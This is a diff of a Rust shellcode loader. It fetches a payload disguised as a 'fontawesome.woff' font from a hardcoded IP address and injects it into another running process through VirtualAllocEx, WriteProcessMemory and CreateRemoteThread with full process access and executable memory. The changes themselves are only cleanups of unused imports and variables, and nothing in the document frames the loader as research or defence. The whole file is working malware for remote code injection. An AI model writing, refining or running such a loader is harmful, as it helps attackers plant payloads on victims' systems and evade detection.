@@ -2,7 +2,7 @@ extern crate kernel32;
 use reqwest;
 use std::ptr;
 use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
-use sysinfo::{Pid, PidExt, ProcessExt, System, SystemExt};
+use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 
 
 fn download_shellcode_from_url(url: &str) -> Result<Vec<u8>, &'static str> {
@@ -34,7 +34,7 @@ fn find_process_by_name(process_name: &str) -> u32 {
 
 fn main() {
     let shellcode_url: &str = "http://192.168.8.188:8003/fontawesome.woff";
-    let mut shellcode: Vec<u8> = Vec::new();
+    let shellcode: Vec<u8>;
     match download_shellcode_from_url(shellcode_url) {
         Ok(downloaded_bytes) => {
             shellcode = downloaded_bytes;
@@ -52,10 +52,10 @@ fn main() {
 
     unsafe {
         let handler = kernel32::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-        let mut address = kernel32::VirtualAllocEx(handler, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        let address = kernel32::VirtualAllocEx(handler, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         let mut bytes_written = 0;
         kernel32::WriteProcessMemory(handler, address, shellcode.as_ptr() as *mut _, shellcode.len() as u64, &mut bytes_written);
-        let thread = kernel32::CreateRemoteThread(handler, ptr::null_mut(), 0, Some(std::mem::transmute(address)), ptr::null_mut(), 0, ptr::null_mut());
+        kernel32::CreateRemoteThread(handler, ptr::null_mut(), 0, Some(std::mem::transmute(address)), ptr::null_mut(), 0, ptr::null_mut());
         kernel32::CloseHandle(handler);
     }
     println!("Shellcode injected successfully.")
